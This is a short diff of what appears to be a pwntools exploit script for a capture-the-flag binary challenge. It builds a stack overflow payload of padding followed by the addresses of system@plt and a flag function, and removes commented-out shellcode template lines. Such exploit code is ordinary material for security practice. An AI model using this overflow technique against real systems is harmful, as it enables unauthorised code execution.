@@ -47,14 +47,6 @@ buf += "A"*(cyclic_find('laaa'))
 buf += p32(system_at_plt)
 buf += p32(flag_function)
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.recvuntil('>')
 io.sendline(buf)
